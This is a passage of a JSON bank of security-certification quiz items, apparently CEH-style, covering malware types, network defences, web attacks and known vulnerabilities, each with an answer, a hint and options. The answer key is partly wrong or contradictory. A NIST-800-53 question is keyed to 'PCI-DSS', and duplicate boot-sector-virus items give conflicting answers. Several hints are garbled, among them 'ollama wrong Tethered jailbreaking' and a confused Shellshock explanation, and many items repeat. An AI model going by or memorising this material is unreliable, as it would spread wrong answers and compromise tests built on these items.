    "hint": "This technique involves direct observation to gather information.",
    "options": [
      "Eavesdropping on phone conversations",
      "Sending phishing emails",
      "Observing someone's screen or keyboard to obtain confidential information",
      "Tricking someone into revealing their password over the phone"
    ]
  },
  {
    "question": "Which type of malware restricts access to a system or data until a ransom is paid?",
    "answer": "Ransomware",
    "hint": "This malware often encrypts the victim's data.",
    "options": [
      "Trojan",
      "Spyware",
      "Ransomware",
      "Adware"
    ]
  },
  {
    "question": "What is the primary goal of ethical hacking?",
    "answer": "To identify and fix security vulnerabilities",
    "hint": "Ethical hackers work to improve security, not compromise it.",
    "options": [
      "To steal sensitive data",
      "To disrupt services",
      "To identify and fix security vulnerabilities",
      "To gain unauthorized access for personal gain"
    ]
  },
  {
    "question": "Which layer of the OSI model is responsible for data formatting and encryption?",
    "answer": "Presentation Layer",
    "hint": "This layer ensures that data is in a usable format and handles data encryption.",
    "options": [
      "Application Layer",
      "Session Layer",
      "Presentation Layer",
      "Transport Layer"
    ]
  },
  {
    "question": "What is the term for malicious software that appears legitimate but performs harmful activities when executed?",
    "answer": "Trojan Horse",
    "hint": "It's named after a deceptive wooden horse from Greek mythology.",
    "options": [
      "Virus",
      "Worm",
      "Trojan Horse",
      "Rootkit"
    ]
  },
  {
    "question": "Which of the following is a legal agreement between a penetration tester and a client outlining the scope and terms of testing?",
    "answer": "Rules of Engagement",
    "hint": "This document defines how a penetration test should be conducted.",
    "options": [
      "Non-Disclosure Agreement",
      "Service Level Agreement",
      "Rules of Engagement",
      "Terms of Service"
    ]
  },
  {
    "question": "Which command-line tool can be used on Windows systems to display active TCP connections and listening ports?",
    "answer": "netstat",
    "hint": "This tool provides network statistics and connection information.",
    "options": [
      "ipconfig",
      "netstat",
      "tracert",
      "ping"
    ]
  },
  {
    "question": "What does 'DNS spoofing' involve?",
    "answer": "Altering DNS records to redirect traffic to malicious sites",
    "hint": "This attack manipulates the Domain Name System.",
    "options": [
      "Scanning DNS servers for vulnerabilities",
      "Flooding DNS servers with traffic",
      "Altering DNS records to redirect traffic to malicious sites",
      "Stealing domain names from legitimate owners"
    ]
  },
  {
    "question": "In cryptography, what does PKI stand for?",
    "answer": "Public Key Infrastructure",
    "hint": "It's a framework for managing digital certificates and public-key encryption.",
    "options": [
      "Private Key Initialization",
      "Public Key Infrastructure",
      "Public Key Integration",
      "Private Key Integration"
    ]
  },
  {
    "question": "Which of the following is a method used to prevent SQL injection attacks?",
    "answer": "Using prepared statements with parameterized queries",
    "hint": "This method ensures that user input does not interfere with SQL query structure.",
    "options": [
      "Disabling database logging",
      "Encrypting the database",
      "Using prepared statements with parameterized queries",
      "Implementing client-side input validation only"
    ]
  },
  {
    "question": "What is 'steganography' in the context of information security?",
    "answer": "Hiding data within other non-secret data",
    "hint": "This technique conceals the existence of the message.",
    "options": [
      "Encrypting data with strong algorithms",
      "Hiding data within other non-secret data",
      "Scanning networks for vulnerabilities",
      "Intercepting network traffic"
    ]
  },
  {
    "question": "Which protocol is used to securely transfer files over SSH?",
    "answer": "SFTP",
    "hint": "It's a secure version of the File Transfer Protocol that operates over SSH.",
    "options": [
      "FTP",
      "SFTP",
      "HTTP",
      "TFTP"
    ]
  },
  {
    "question": "What is a 'zero-day' vulnerability?",
    "answer": "A vulnerability that is unknown to those interested in mitigating it",
    "hint": "These vulnerabilities are exploited before a fix is available.",
    "options": [
      "A vulnerability that is known and patched",
      "A vulnerability that is unknown to those interested in mitigating it",
      "A vulnerability that only affects systems for one day",
      "A vulnerability that has minimal impact"
    ]
  },
  {
    "question": "Which of the following best describes 'footprinting' in ethical hacking?",
    "answer": "Gathering information about a target system to find ways to penetrate it",
    "hint": "It's the first phase of ethical hacking involving reconnaissance.",
    "options": [
      "Deleting logs after an attack",
      "Gathering information about a target system to find ways to penetrate it",
      "Exploiting vulnerabilities in a system",
      "Covering tracks to avoid detection"
    ]
  },
  {
    "question": "What is the main purpose of an Intrusion Detection System (IDS)?",
    "answer": "To monitor network traffic for suspicious activity and alert administrators",
    "hint": "An IDS detects potential security breaches but does not block traffic.",
    "options": [
      "To prevent unauthorized access by blocking traffic",
      "To monitor network traffic for suspicious activity and alert administrators",
      "To encrypt data in transit",
      "To balance network load among servers"
    ]
  },
  {
    "question": "Which type of malware self-replicates by infecting other programs?",
    "answer": "Virus",
    "hint": "This malware requires user action to spread between programs.",
    "options": [
      "Worm",
      "Virus",
      "Trojan Horse",
      "Rootkit"
    ]
  },
  {
    "question": "What is 'enumeration' in the context of network security?",
    "answer": "Extracting user names, machine names, network resources, and services from a system",
    "hint": "This process involves gathering detailed information after initial scanning.",
    "options": [
      "Scanning for open ports",
      "Extracting user names, machine names, network resources, and services from a system",
      "Performing a denial-of-service attack",
      "Encrypting sensitive data"
    ]
  },
  {
    "question": "Which tool is widely used for packet capturing and network analysis?",
    "answer": "Wireshark",
    "hint": "It's a free and open-source packet analyzer used for network troubleshooting.",
    "options": [
      "Nmap",
      "Wireshark",
      "Metasploit",
      "John the Ripper"
    ]
  },
  {
    "question": "What is the primary purpose of SSL/TLS in network communications?",
    "answer": "To provide secure encrypted communication over a computer network",
    "hint": "It's the underlying technology that secures HTTPS.",
    "options": [
      "To compress data for faster transmission",
      "To assign IP addresses dynamically",
      "To provide secure encrypted communication over a computer network",
      "To monitor network performance"
    ]
  },
  {
    "question": "Which of the following is a social engineering attack that involves leaving infected USB drives in public places?",
    "answer": "Baiting",
    "hint": "The attacker relies on the curiosity or greed of the victim.",
    "options": [
      "Phishing",
      "Baiting",
      "Pretexting",
      "Tailgating"
    ]
  },
  {
    "question": "In the context of access control models, what does DAC stand for?",
    "answer": "Discretionary Access Control",
    "hint": "This model allows data owners to control access to their resources.",
    "options": [
      "Direct Access Control",
      "Discretionary Access Control",
      "Distributed Access Control",
      "Dynamic Access Control"
    ]
  },
  {
    "question": "Which phase of the ethical hacking process involves covering tracks and hiding evidence of a breach?",
    "answer": "Maintaining Access and Covering Tracks",
    "hint": "This phase ensures the attacker remains undetected.",
    "options": [
      "Scanning",
      "Gaining Access",
      "Maintaining Access and Covering Tracks",
      "Reconnaissance"
    ]
  },
  {
    "question": "What is 'salting' in the context of password security?",
    "answer": "Adding random data to passwords before hashing to prevent attacks",
    "hint": "This technique defends against rainbow table attacks.",
    "options": [
      "Encrypting passwords with symmetric encryption",
      "Adding random data to passwords before hashing to prevent attacks",
      "Storing passwords in plain text",
      "Using the same password across multiple accounts"
    ]
  },
  {
    "question": "Which of the following is an example of a two-factor authentication method?",
    "answer": "ATM card and PIN",
    "hint": "It combines something you have with something you know.",
    "options": [
      "Username and password",
      "Fingerprint scan",
      "ATM card and PIN",
      "Security questions"
    ]
  },
  {
    "question": "What does the term 'buffer overflow' refer to in programming?",
    "answer": "Anomaly where a program writes data beyond the buffer's boundary",
    "hint": "This can lead to system crashes or exploitation by attackers.",
    "options": [
      "A buffer that is empty and cannot accept data",
      "Anomaly where a program writes data beyond the buffer's boundary",
      "A method to optimize memory usage",
      "A way to encrypt data in memory"
    ]
  },
  {
    "question": "Which protocol is used for secure remote login and other secure network services over an insecure network?",
    "answer": "SSH",
    "hint": "It's a cryptographic network protocol for operating network services securely.",
    "options": [
      "Telnet",
      "FTP",
      "SSH",
      "SMTP"
    ]
  },
  {
    "question": "In cybersecurity, what is 'privilege escalation'?",
    "answer": "Exploiting a bug or flaw to gain higher access levels",
    "hint": "Attackers use this to gain administrative rights.",
    "options": [
      "Downgrading user privileges",
      "Exploiting a bug or flaw to gain higher access levels",
      "Monitoring user activities",
      "Encrypting sensitive files"
    ]
  },
  {
    "question": "Which of the following describes 'ARP poisoning'?",
    "answer": "Sending falsified ARP messages to associate an attacker's MAC address with a legitimate IP address",
    "hint": "This attack allows interception of data frames on a network.",
    "options": [
      "Flooding the network with ARP requests",
      "Blocking ARP messages in the network",
      "Sending falsified ARP messages to associate an attacker's MAC address with a legitimate IP address",
      "Scanning for open ports using ARP packets"
    ]
  },
  {
    "question": "What is the primary function of a 'sandbox' in cybersecurity?",
    "answer": "To isolate programs to prevent security breaches",
    "hint": "It's an environment used for testing or running untrusted programs safely.",
    "options": [
      "To clean malware from infected files",
      "To encrypt data before transmission",
      "To isolate programs to prevent security breaches",
      "To store backup data securely"
    ]
  },
  {
    "question": "Which type of scan involves sending packets to ports without completing the TCP handshake?",
    "answer": "Stealth Scan",
    "hint": "This scan type is also known as a half-open scan.",
    "options": [
      "UDP Scan",
      "Stealth Scan",
      "Ping Sweep",
      "Connect Scan"
    ]
  },
  {
    "question": "What is the purpose of using a 'demilitarized zone' (DMZ) in network architecture?",
    "answer": "To add an additional layer of security by isolating external services",
    "hint": "A DMZ acts as a buffer zone between the public internet and the private network.",
    "options": [
      "To speed up internal network traffic",
      "To add an additional layer of security by isolating external services",
      "To store encrypted data",
      "To monitor employee internet usage"
    ]
  },
  {
    "question": "In the context of web security, what is 'Cross-Site Request Forgery' (CSRF)?",
    "answer": "An attack that tricks a user into performing actions on a web application without their consent",
    "hint": "This attack exploits the trust a website has in a user's browser.",
    "options": [
      "An attack that injects malicious scripts into webpages",
      "An attack that tricks a user into performing actions on a web application without their consent",
      "An attack that exploits input validation vulnerabilities",
      "An attack that steals session cookies"
    ]
  },
  {
    "question": "Which encryption protocol is considered obsolete and should no longer be used due to vulnerabilities?",
    "answer": "WEP",
    "hint": "This protocol was an early attempt to secure wireless networks but is now easily cracked.",
    "options": [
      "WPA3",
      "WPA2",
      "WEP",
      "AES"
    ]
  },
  {
    "question": "What is the main purpose of a 'rootkit'?",
    "answer": "To hide malicious activities and provide privileged access to a computer",
    "hint": "This type of malware is designed to remain hidden from users and security software.",
    "options": [
      "To replicate itself and spread to other computers",
      "To encrypt files and demand a ransom",
      "To display unwanted advertisements",
      "To hide malicious activities and provide privileged access to a computer"
    ]
  },
  {
    "question": "Which technique is used by attackers to redirect users to a fake website without their knowledge?",
    "answer": "Pharming",
    "hint": "This attack manipulates DNS entries to redirect traffic.",
    "options": [
      "Phishing",
      "Spoofing",
      "Pharming",
      "Sniffing"
    ]
  },
  {
    "question": "In ethical hacking, what does 'black box testing' entail?",
    "answer": "Testing with no prior knowledge of the system's internal workings",
    "hint": "The tester approaches the system as an external attacker would.",
    "options": [
      "Testing with full knowledge of the system's source code",
      "Testing only the user interface of an application",
      "Testing with no prior knowledge of the system's internal workings",
      "Testing by simulating user behavior"
    ]
  },
  {
    "question": "Which of the following is a protocol analyzer tool?",
    "answer": "tcpdump",
    "hint": "This command-line tool captures and analyzes network traffic.",
    "options": [
      "tcpdump",
      "ifconfig",
      "iptables",
      "nslookup"
    ]
  },
  {
    "question": "What is 'war driving' in the context of wireless security?",
    "answer": "Driving around searching for wireless networks",
    "hint": "Attackers use this method to find unsecured Wi-Fi networks.",
    "options": [
      "Attacking wireless networks remotely",
      "Setting up rogue access points",
      "Driving around searching for wireless networks",
      "Interfering with wireless signals"
    ]
  },
  {
    "question": "Which of the following best describes 'session hijacking'?",
    "answer": "Taking over a user's session after authentication",
    "hint": "This attack involves stealing or predicting session tokens.",
    "options": [
      "Guessing a user's password",
      "Taking over a user's session after authentication",
      "Eavesdropping on network traffic",
      "Crashing a user's application"
    ]
  },
  {
    "question": "What is 'social engineering' in cybersecurity?",
    "answer": "Manipulating people into divulging confidential information",
    "hint": "This technique exploits human psychology rather than technical vulnerabilities.",
    "options": [
      "Developing social media security policies",
      "Manipulating people into divulging confidential information",
      "Using algorithms to detect social trends",
      "Encrypting social media data"
    ]
  },
  {
    "question": "Which law establishes requirements for the safeguarding of consumer financial information in the United States?",
    "answer": "Gramm-Leach-Bliley Act (GLBA)",
    "hint": "This act is also known as the Financial Services Modernization Act of 1999.",
    "options": [
      "HIPAA",
      "Sarbanes-Oxley Act",
      "Gramm-Leach-Bliley Act (GLBA)",
      "FERPA"
    ]
  },
  {
    "question": "In a Public Key Infrastructure (PKI), what is the role of a Certificate Authority (CA)?",
    "answer": "To issue and manage security credentials and public keys",
    "hint": "The CA is a trusted entity that validates identities.",
    "options": [
      "To encrypt data during transmission",
      "To store private keys securely",
      "To issue and manage security credentials and public keys",
      "To authenticate users through passwords"
    ]
  },
  {
    "question": "Which of the following best describes 'defense in depth'?",
    "answer": "A multi-layered approach to security",
    "hint": "This strategy involves multiple security measures to protect information.",
    "options": [
      "Focusing all security efforts on the network perimeter",
      "Using a single security solution to protect assets",
      "A multi-layered approach to security",
      "Outsourcing security responsibilities"
    ]
  },
  {
    "question": "Larry, a security professional in an organization, has noticed some abnormalities in the user accounts on a web server. To thwart evolving attacks, he decided to harden the security of the web server by adopting a few countermeasures to secure the accounts on the web server.\n\nWhich of the following countermeasures must Larry implement to secure the user accounts on the web server?",
    "answer": "Limit the administrator or root-level access to the minimum number of users",
    "hint": "Limiting administrator or root-level access follows the principle of least privilege, reducing the risk of unauthorized access and misuse of privileges.",
    "options": [
      "Limit the administrator or root-level access to the minimum number of users",
      "Enable all non-interactive accounts that should exist but do not require interactive login",
      "Retain all unused modules and application extensions",
      "Enable unused default user accounts created during the installation of an OS"
    ]
  },
  {
    "question": "An organization decided to harden its security against web-application and web-server attacks. John, a security personnel in the organization, employed a security scanner to automate web-application security testing and to guard the organization's web infrastructure against web-application threats. Using that tool, he also wants to detect XSS, directory traversal problems, fault injection, SQL injection, attempts to execute commands, and several other attacks.\n\nWhich of the following security scanners will help John perform the above task?",
    "answer": "Syhunt Hybrid",
    "hint": "Syhunt Hybrid is a web application security scanner that can detect a wide range of vulnerabilities including XSS, SQL injection, and more.",
    "options": [
      "AlienVault® OSSIM™",
      "Cisco ASA",
      "Syhunt Hybrid",
      "Saleae Logic Analyzer"
    ]
  },
  {
    "question": "Which file is a rich target to discover the structure of a website during web-server footprinting?",
    "answer": "Robots.txt",
    "hint": "The robots.txt file can reveal directories and files that are disallowed for web crawlers, potentially exposing sensitive areas of the website.",
    "options": [
      "domain.txt",
      "index.html",
      "Document root",
      "Robots.txt"
    ]
  },
  {
    "question": "Jane, an ethical hacker, is testing a target organization’s web server and website to identify security loopholes. In this process, she copied the entire website and its content on a local drive to view the complete profile of the site’s directory structure, file structure, external links, images, web pages, and so on. This information helps Jane map the website’s directories and gain valuable information.\n\nWhat is the attack technique employed by Jane in the above scenario?",
    "answer": "Website mirroring",
    "hint": "Website mirroring involves copying an entire website to analyze its structure and content offline.",
    "options": [
      "Website defacement",
      "Website mirroring",
      "Session hijacking",
      "Web cache poisoning"
    ]
  },
  {
    "question": "Which of the following tools performs comprehensive tests against web servers, including dangerous files and CGIs?",
    "answer": "Nikto",
    "hint": "Nikto is a web server scanner that checks for potentially dangerous files/CGIs and other security issues.",
    "options": [
      "Nikto",
      "John the Ripper",
      "Dsniff",
      "Snort"
    ]
  },
  {
    "question": "What are common files on a web server that can be misconfigured and provide useful information for a hacker such as verbose error messages?",
    "answer": "httpd.conf",
    "hint": "Misconfigurations in httpd.conf can lead to information disclosure through verbose error messages and directory listings.",
    "options": [
      "php.ini",
      "httpd.conf",
      "administration.config",
      "idq.dll"
    ]
  },
  {
    "question": "A regional bank hires your company to perform a security assessment on their network after a recent data breach. The attacker was able to steal financial data from the bank by compromising only a single server. Based on this information, what should be one of your key recommendations to the bank?",
    "answer": "Place a front-end web server in a demilitarized zone that only handles external web traffic",
    "hint": "Using a DMZ isolates external-facing servers from the internal network, limiting exposure in case of a breach.",
    "options": [
      "Require all employees to change their anti-virus program with a new one",
      "Place a front-end web server in a demilitarized zone that only handles external web traffic",
      "Issue new certificates to the web servers from the root certificate authority",
      "Move the financial data to another server on the same IP subnet"
    ]
  },
  {
    "question": "While testing a web application in development, you notice that the web server does not properly ignore the “dot dot slash” (../) character string and instead returns the file listing of a folder higher up in the folder structure of the server.\n\nWhat kind of attack is possible in this scenario?",
    "answer": "Directory traversal",
    "hint": "Directory traversal exploits insufficient input validation to access files and directories outside of the web root.",
    "options": [
      "SQL injection",
      "Denial of service",
      "Cross-site scripting",
      "Directory traversal"
    ]
  },
  {
    "question": "The establishment of a TCP connection involves a negotiation called three-way handshake. What type of message does the client send to the server in order to begin this negotiation?",
    "answer": "SYN",
    "hint": "Initiating a new connection",
    "options": [
      "RST",
      "SYN-ACK",
      "ACK",
      "SYN"
    ]
  },
  {
    "question": "Which type of security feature stops vehicles from crashing through the doors of a building?",
    "answer": "Bollards",
    "hint": "Physical barriers often found outside buildings to prevent vehicle access",
    "options": [
      "Turnstile",
      "Bollards",
      "Mantrap",
      "Receptionist"
    ]
  },
  {
    "question": "The company ABC recently contracts a new accountant. The accountant will be working with the financial statements. Those financial statements need to be approved by the CFO and then they will be sent to the accountant but the CFO is worried because he wants to be sure that the information sent to the accountant was not modified once he approved it. Which of the following options can be useful to ensure the integrity of the data?",
    "answer": "The CFO can use a hash algorithm in the document once he approved the financial statements",
    "hint": "Data integrity solution",
    "options": [
      "The CFO can use a hash algorithm in the document once he approved the financial statements",
      "The financial statements can be sent twice, one by email and the other delivered in USB and the accountant can compare both to be sure is the same document",
      "The document can be sent to the accountant using an exclusive USB for that document",
      "The CFO can use an excel file with a pass"
    ]
  },
  {
    "question": "What is the purpose of a demilitarized zone (Perimeter Network)  on a network?",
    "answer": "To only provide direct access to the nodes within the DMZ and protect the network behind it",
    "hint": "It acts as a buffer zone, allowing controlled external access while protecting sensitive resources inside the main network",
    "options": [
      "To provide a place to put the honeypot",
      "To only provide direct access to the nodes within the DMZ and protect the network behind it",
      "To contain the network devices you wish to protect",
      "To scan all traffic coming through the DMZ to the internal network"
    ]
  },
  {
    "question": "Which of the following Linux commands will resolve a domain name into IP address?",
    "answer": ">host -t a hackeddomain.com",
    "hint": "Try using the 'A' flag with host command for DNS record lookup (IPv4 address).",
    "options": [
      ">host -t AXFR hackeddomain.com",
      ">host -t a hackeddomain.com",
      ">host -t ns hackeddomain.com",
      ">host -t soa hackeddomain.com"
    ]
  },
  {
    "question": "Shellshock allowed an unauthorized user to gain access to a server. It affected many Internet-facing services, which OS did it not directly affect?",
    "answer": "Windows",
    "hint": "Windows is based on the NT kernel and uses Jumpers or Registry settings to execute shell commands; Shellshock exploits a vulnerability in Bash, which isn't native to it.",
    "options": [
      "Unix",
      "Linux",
      "Windows",
      "macOS"
    ]
  },
  {
    "question": "Which regulation defines security and privacy controls for Federal information systems and organizations?",
    "answer": "PCI-DSS",
    "hint": "Hint: It's a U.S National Institute of Standards and Technology publication focused on security controls for federal information systems.",
    "options": [
      "NIST-800-53",
      "PCI-DSS",
      "HIPAA",
      "EU Safe Harbor"
    ]
  },
  {
    "question": "What is a “Collision attack” in cryptography?",
    "answer": "Collision attacks try to find two inputs producing the same hash",
    "hint": " Collusion attack tries to find two inputs producing the same hash",
    "options": [
      "Collision attacks try to find two inputs producing the same hash",
      "Collision attacks try to break the hash into two parts, with the same bytes in each part to get the private key",
      "Collision attacks try to break the hash into three parts to get the plaintext value",
      "Collision attacks try to get the public key"
    ]
  },
  {
    "question": "Which of the following tools can be used for passive OS fingerprinting?",
    "answer": "tcpdump",
    "hint": "Hint: It's a network packet analyzer, often used in monitoring and capturing data packets to identify system details passively",
    "options": [
      "nmap",
      "tracert",
      "tcpdump",
      "ping"
    ]
  },
  {
    "question": "Which of the following describes the characteristics of a Boot Sector Virus?",
    "answer": "Overwrites the original MBR and only executes the new virus code.",
    "hint": "2.\") Hint: This type modifies system startup behavior by relocating and replacing its own copy in a critical area of boot sector operation\"",
    "options": [
      "Overwrites the original MBR and only executes the new virus code.",
      "Moves the MBR to another location on the RAM and copies itself to the original location of the MBR.",
      "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.",
      "Modifies directory table entries so that directory entries point to the virus code instead of the actual program."
    ]
  },
  {
    "question": "Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?",
    "answer": "Use a scan tool like Nessus",
    "hint": "A dedicated scan tool is designed to discover vulnerabilities on various systems.",
    "options": [
      "Use a scan tool like Nessus",
      "Check MITRE.org for the latest list of CVE findings",
      "Create a disk image of a clean Windows installation",
      "Use the built-in Windows Update tool"
    ]
  },
  {
    "question": "Which IOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after each successive reboot?",
    "answer": "Untethered jailbreaking",
    "hint": "This method requires the device to be connected during boot ollama wrong Tethered jailbreaking",
    "options": [
      "Semi-untethered jailbreaking",
      "Tethered jailbreaking",
      "Semi-tethered jailbreaking",
      "Untethered jailbreaking"
    ]
  },
  {
    "question": "What is the file that determines the basic configuration (specifically activities, services, broadcast receivers, etc.) in an Android application?",
    "answer": "AndroidManifest.xml",
    "hint": "It is the main configuration file for your app.",
    "options": [
      "AndroidManifest.xml",
      "classes.dex",
      "resources.asrc",
      "APK.info"
    ]
  },
  {
    "question": "Don, a student, came across a gaming app in a third-party app store and installed it. Subsequently, all the legitimate apps in his smartphone were replaced by deceptive applications that appeared legitimate. He also received many advertisements on his smartphone after installing the app. What is the attack performed on Don in the above scenario?",
    "answer": "Agent Smith attack",
    "hint": "Malware replaces legitimate apps with fake ones",
    "options": [
      "Agent Smith attack",
      "SMS phishing attack",
      "SIM card attack",
      "Clickjacking"
    ]
  },
  {
    "question": "Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?",
    "answer": "Use a scan tool like Nessus",
    "hint": "A dedicated scan tool is designed to discover vulnerabilities on various systems.",
    "options": [
      "Use a scan tool like Nessus",
      "Check MITRE.org for the latest list of CVE findings",
      "Create a disk image of a clean Windows installation",
      "Use the built-in Windows Update tool"
    ]
  },
  {
    "question": "Which of the following describes the characteristics of a Boot Sector Virus?",
    "answer": "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.",
    "hint": "This type infects by moving the Master Boot Record.",
    "options": [
      "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.",
      "Overwrites the original MBR and only executes the new virus code.",
      "Modifies directory table entries so that directory entries point to the virus code instead of the actual program.",
      "Moves the MBR to another location on the RAM and copies itself to the original location of the MBR."
    ]
  },
  {
    "question": "Which of the following tools can be used for passive OS fingerprinting?",
    "answer": "tcpdump",
    "hint": "This tool captures network traffic.",
    "options": [
      "tracert",
      "tcpdump",
      "ping",
      "nmap"
    ]
  },
  {
    "question": "What is a “Collision attack” in cryptography?",
    "answer": "Collision attacks try to find two inputs producing the same hash",
    "hint": "Focus on understanding what a collision is",
    "options": [
      "Collision attacks try to break the hash into three parts to get the plaintext value",
      "Collision attacks try to get the public key",
      "Collision attacks try to find two inputs producing the same hash",
      "Collision attacks try to break the hash into two parts, with the same bytes in each part to get the private key"
    ]
  },
  {
    "question": "Which regulation defines security and privacy controls for Federal information systems and organizations?",
    "answer": "NIST-800-53",
    "hint": "This regulation is published by the National Institute of Standards and Technology.",
    "options": [
      "NIST-800-53",
      "EU Safe Harbor",
      "HIPAA",
      "PCI-DSS"
    ]
  },
  {
    "question": "Shellshock allowed an unauthorized user to gain access to a server. It affected many Internet-facing services, which OS did it not directly affect?",
    "answer": "Windows",
    "hint": "Shellshock specifically targeted the Bash shell.",
    "options": [
      "Linux",
      "macOS",
      "Windows",
      "Unix"
    ]
  },
  {
    "question": "Which of the following Linux commands will resolve a domain name into IP address?",
    "answer": ">host -t a hackeddomain.com",
    "hint": "-t flag specifies the type of DNS record to query.",
    "options": [
      ">host -t ns hackeddomain.com",
      ">host -t soa hackeddomain.com",
      ">host -t a hackeddomain.com",
      ">host -t AXFR hackeddomain.com"
    ]
  },
  {
    "question": "What is the purpose of a demilitarized zone (Perimeter Network)  on a network?",
    "answer": "To only provide direct access to the nodes within the DMZ and protect the network behind it",
    "hint": "A demilitarized zone is designed as an additional layer of security for internal networks.",
    "options": [
      "To scan all traffic coming through the DMZ to the internal network",
      "To only provide direct access to the nodes within the DMZ and protect the network behind it",
      "To contain the network devices you wish to protect",
      "To provide a place to put the honeypot"
    ]
  },
  {
    "question": "What is the purpose of a demilitarized zone (Perimeter Network)  on a network?",
    "answer": "To only provide direct access to the nodes within the DMZ and protect the network behind it",
    "hint": "A demilitarized zone (DMZ) is designed as an additional layer of security between your internal LAN and untrusted networks.",
    "options": [
      "To scan all traffic coming through the DMZ to the internal network",
      "To only provide direct access to the nodes within the DMZ and protect the network behind it",
      "To contain the network devices you wish to protect",
      "To provide a place to put the honeypot"
    ]
  },
  {
    "question": "The company ABC recently contracts a new accountant. The accountant will be working with the financial statements. Those financial statements need to be approved by the CFO and then they will be sent to the accountant but the CFO is worried because he wants to be sure that the information sent to the accountant was not modified once he approved it. Which of the following options can be useful to ensure the integrity of the data?",
    "answer": "The CFO can use a hash algorithm in the document once he approved the financial statements",
    "hint": "A hash algorithm ensures data integrity by generating a unique checksum.",
    "options": [
      "The financial statements can be sent twice, one by email and the other delivered in USB and the accountant can compare both to be sure is the same document",
      "The CFO can use an excel file with a password",
      "The document can be sent to the accountant using an exclusive USB for that document",
      "The CFO can use a hash algorithm in the document once he approved the financial statements"
    ]
  },
  {
    "question": "While using your bank’s online servicing you notice the following string in the URL bar:  “http://www.MyPersonalBank.com/account?id=368940911028389&Damount=10980&Camount=21”  You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflect the changes.  Which type of vulnerability is present on this site?",
    "answer": "Web Parameter Tampering",
    "hint": "The URL parameters can be tampered with to change data.",
    "options": [
      "XSS Reflection",
      "Cookie Tampering",
      "SQL Injection",
      "Web Parameter Tampering"
    ]
  },
  {
    "question": "Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?",
    "answer": "Use a scan tool like Nessus",
    "hint": "A dedicated vulnerability scanner is more effective than built-in tools or just checking lists.",
    "options": [
      "Use the built-in Windows Update tool",
      "Use a scan tool like Nessus",
      "Create a disk image of a clean Windows installation",
      "Check MITRE.org for the latest list of CVE findings"
    ]
  },
  {
    "question": "Which of the following is a command line packet analyzer similar to GUI-based Wireshark?",
    "answer": "tcpdump",
    "hint": "tcpdump is a command line packet analyzer similar to GUI-based Wireshark.",
    "options": [
      "ethereal",
      "nessus",
      "jack the ripper",
      "tcpdump"
    ]
  },
  {
    "question": "DHCP snooping is a great solution to prevent rogue DHCP servers on your network. Which security feature on switchers leverages the DHCP snooping database to help prevent man-in-the-middle attacks?",
    "answer": "Dynamic ARP Inspection (DAI)",
    "hint": "This feature relates to inspecting ARP packets",
    "options": [
      "Layer 2 Attack Prevention Protocol (LAPP)",
      "Spanning tree",
      "Dynamic ARP Inspection (DAI)",
      "Port security"
    ]
  },
  {
    "question": "Bob, a network administrator at BigUniversity, realized that some students are connecting their notebooks in the wired network to have Internet access. In the university campus, there are many Ethernet ports available for professors and authorized visitors but not for students. He identified this when the IDS alerted for malware activities in the network. What should Bob do to avoid this problem?",
    "answer": "Use the 802.1x protocol",
    "hint": "The correct option involves using an authentication mechanism.",
    "options": [
      "Ask students to use the wireless network",
      "Separate students in a different VLAN",
      "Use the 802.1x protocol",
      "Disable unused ports in the switches"
    ]
  },
  {
    "question": "A company’s policy requires employees to perform file transfers using protocols which encrypt traffic. You suspect some employees are still performing file transfers using unencrypted protocols because the employees do not like changes. You have positioned a network sniffer to capture traffic from the laptops used by employees in the data ingest department. Using Wireshark to examine the captured traffic, which command can be used as a display filter to find unencrypted file transfers?",
    "answer": "tcp.port = = 21",
    "hint": "TCP port 21 is typically used for unencrypted FTP.",
    "options": [
      "tcp.port = 23",
      "tcp.port = = 21",
      "tcp.port = = 21 | | tcp.port = =22",
      "tcp.port ! = 21"
    ]
  },
  {
    "question": "You just set up a security system in your network. In what kind of system would you find the following string of characters used as a rule within its configuration?  Alert tcp any any -> 192.168.100.0/24 21 (msg: \"\"TFP on the network!\"\";)",
    "answer": "An Intrusion Detection System",
    "hint": "It's a detection system.",
    "options": [
      "A firewall IPTable",
      "An Intrusion Detection System",
      "A Router IPTable",
      "FTP Server rule"
    ]
  },
  {
    "question": "Which of the following program infects the system boot sector and the executable files at the same time?",
    "answer": "Multipartie Virus",
    "hint": "This type of virus infects multiple parts of a system simultaneously.",
    "options": [
      "Stealth virus",
      "Macro Virus",
      "Polymorphic virus",
      "Multipartie Virus"
    ]
  },
  {
    "question": "To determine if a software program properly handles a wide range of invalid input, a form of automated testing can be used to randomly generate invalid input in an attempt to crash the program.  What term is commonly used when referring to this type of testing?",
    "answer": "Fuzzing",
    "hint": "This involves sending random or invalid input data.",
    "options": [
      "Bounding",
      "Mutating",
      "Randomizing",
      "Fuzzing"
    ]
  },
  {
    "question": "An Intrusion Detection System (IDS) has alerted the network administrator to a possibly malicious sequence of packets sent to a Web server in the network’s external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. What type of network tool can be used to determine if these packets are genuinely malicious or simply a false positive?",
    "answer": "Protocol analyzer",
    "hint": "A protocol analyzer can examine the contents of packets to determine if they are malicious.",
    "options": [
      "Intrusion Prevention System (IPS)",
      "Vulnerability scanner",
      "Network sniffer",
      "Protocol analyzer"
    ]
  },
  {
    "question": "The Heartbleed bug was discovered in 2014 and is widely referred to under MITRE’s Common Vulnerabilities and Exposures (CVE) as CVE-2014-0160. This bug affects the OpenSSL implementation of the Transport Layer Security (TLS) protocols defined in RFC6520.  What type of key does this bug leave exposed to the Internet making exploitation of any compromised system very easy?",
    "answer": "Private",
    "hint": "The Heartbleed bug exposes sensitive information including private keys.",
    "options": [
      "Root",
      "Shared",
      "Public",
      "Private"
    ]
  },
  {
    "question": "Why should the security analyst disable/remove unnecessary ISAPI filters?",
    "answer": "To defend against webserver attacks",
    "hint": "ISAPI filters are related to the operation of a server.",
    "options": [
      "To defend against webserver attacks",
      "To defend against wireless attacks",
      "To defend against social engineering attacks",
      "To defend against jailbreaking"
    ]
  },
  {
    "question": "Which of the following is a component of a risk assessment?",
    "answer": "Administrative safeguards",
    "hint": "This option relates to policies and procedures.",
